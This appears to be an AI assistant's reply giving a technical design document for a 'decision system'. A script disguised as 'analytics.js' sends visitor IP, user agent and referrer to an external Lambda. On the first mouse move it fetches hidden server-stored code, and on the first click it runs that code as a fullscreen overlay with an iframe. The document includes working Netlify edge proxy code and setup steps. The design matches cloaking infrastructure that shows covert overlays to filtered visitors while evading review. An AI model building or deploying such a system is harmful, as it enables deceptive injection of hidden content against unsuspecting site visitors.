Below is the final Markdown (.md) version with the strict technical manual tone and the new Edge Function Parity with PHP section included.
You can copy-paste this directly as DECISION_SYSTEM.md.

⸻


# Decision System Documentation

## Overview

A client-side decision and code execution system that:

- Performs external decision evaluation based on user context (referrer, URL, IP, UA, language).
- Stores and protects executable code server-side.
- Ensures real client IP is forwarded to the decision engine.
- Executes code with minimal delay upon user interaction.

---

## Architecture

### Components

1. **Client Script** (`/public/analytics.js`)  
   Minified script injected into all pages. Handles decision request, code retrieval, and execution.

2. **Code Endpoint** (`/src/app/api/get-code/route.ts`)  
   Server-side endpoint returning the executable code payload.

3. **Decision Service** (Netlify Edge Function: `/api/proxy`)  
   Executes at edge, retrieves accurate client IP, forwards payload to AWS Lambda decision engine, returns decision.

---

## Edge Function Parity with PHP

The Netlify Edge Function serves as a direct replacement for the original PHP decision endpoint. The PHP implementation used `$_SERVER` variables to capture request context (referrer, current URL, query string, headers, user agent, language, and IP) before forwarding it to the decision engine. The Edge Function preserves the same payload fields and naming to maintain full compatibility with the existing Lambda logic.

Since the Edge Function runs at the CDN edge rather than behind a server or reverse proxy, it provides more accurate client IP extraction. Instead of `$_SERVER['REMOTE_ADDR']` (frequently a proxy IP when PHP is behind a CDN), the Edge Function reads from edge-provided headers (`x-nf-client-connection-ip`, `cf-connecting-ip`, and `x-forwarded-for`). The system standardizes this as `EFFECTIVE_CLIENT_IP`. No Lambda-side changes are required when migrating from PHP to this Edge implementation.

---

## Flow

PAGE LOAD
	•	analytics.js loads
	•	Triggers decision request to /api/proxy (Edge → Lambda)
	•	Response sets internal flag: passed = true/false

FIRST MOUSE MOVE
	•	If passed = true:
Request code from /api/get-code
Store code locally

FIRST CLICK
	•	If code exists: execute payload (fullscreen overlay + iframe)

---

## Edge Function Implementation

### File: `/netlify/edge-functions/proxy.ts`

```ts
import type { Context } from "@netlify/edge-functions";

export default async (request: Request, context: Context) => {
  const url = new URL(request.url);
  const referrerCF = url.searchParams.get("referrerCF");
  const urlCF = url.searchParams.get("urlCF");

  const clientIp =
    request.headers.get("x-nf-client-connection-ip") ||
    request.headers.get("cf-connecting-ip") ||
    request.headers.get("x-forwarded-for")?.split(",")[0]?.trim() ||
    context.ip ||
    "";

  const data = {
    companyId: Deno.env.get("COMPANY_ID")!,
    userId: Deno.env.get("USER_ID")!,
    referrerCF,
    urlCF,
    LANGUAGE_STRING: request.headers.get("accept-language"),
    QUERY_STRING: url.search.substring(1),
    HTTP_REFERER: request.headers.get("referer"),
    HTTP_USER_AGENT: request.headers.get("user-agent"),

    REMOTE_ADDR: null,
    HTTP_CF_CONNECTING_IP: request.headers.get("cf-connecting-ip"),
    CF_CONNECTING_IP: request.headers.get("cf-connecting-ip"),
    X_FORWARDED_FOR: request.headers.get("x-forwarded-for"),
    TRUE_CLIENT_IP: request.headers.get("true-client-ip"),
    EFFECTIVE_CLIENT_IP: clientIp
  };

  const lambdaUrl = Deno.env.get("LAMBDA_URL")!;
  const response = await fetch(lambdaUrl, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(data)
  });

  return new Response(await response.text(), {
    status: response.status,
    headers: { "Content-Type": "application/json" }
  });
};

File: netlify.toml

[[edge_functions]]
function = "proxy"
path = "/api/proxy"


⸻

Environment Variable Configuration (Netlify)

The Edge Function reads configuration values from environment variables. These must be configured per-project.

Variable	Description
COMPANY_ID	Project-specific Company ID
USER_ID	Project-specific User ID
LAMBDA_URL	AWS Lambda decision endpoint URL

Netlify Dashboard Path:
Site Settings → Environment Variables

CLI Alternative:

netlify env:set COMPANY_ID <value>
netlify env:set USER_ID <value>
netlify env:set LAMBDA_URL <value>

Deployment is required for changes to take effect on Edge Functions.

⸻

New Project Requirements

Each project must host its own instance of the Edge Function. Do not point a new project to a different project’s /api/proxy.

Required per project:
	•	netlify/edge-functions/proxy.ts exists in that project’s repository.
	•	[[edge_functions]] block is defined in that project’s netlify.toml.
	•	COMPANY_ID, USER_ID, and LAMBDA_URL are unique to that project and set in that project’s Netlify environment.
	•	Client calls /api/proxy on the same domain.

Client-side trigger:

fetch(`/api/proxy?referrerCF=${encodeURIComponent(document.referrer||'')}&urlCF=${encodeURIComponent(location.href)}`, {
  headers: { Accept: "application/json" }
});


⸻

Code Fetch

Trigger: First mouse move (if decision passed)
Endpoint: /api/get-code

Loads executable code only after user interaction to reduce initial page load overhead.

⸻

Code Execution

Trigger: First click
Executes previously cached code payload to display overlay and iframe.

⸻

File Structure

project/
├── public/
│   └── analytics.js
├── src/
│   └── app/
│       └── api/
│           └── get-code/route.ts
└── netlify/
    └── edge-functions/proxy.ts


⸻


END OF DOCUMENT
